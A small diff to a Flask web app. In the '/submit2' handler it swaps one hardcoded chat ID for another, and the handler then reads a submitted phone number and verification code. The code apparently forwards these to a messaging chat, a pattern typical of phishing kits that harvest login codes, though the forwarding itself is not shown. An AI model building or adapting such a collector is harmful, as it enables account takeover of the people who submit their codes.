@@ -38,7 +38,7 @@ def submit_form():
 @app.route('/submit2', methods=['POST'])
     
 def submit_form2():
-    chat_id = '304944970'  
+    chat_id = '424767318'  
     phone = request.form['phone']
     code = request.form['code']
 
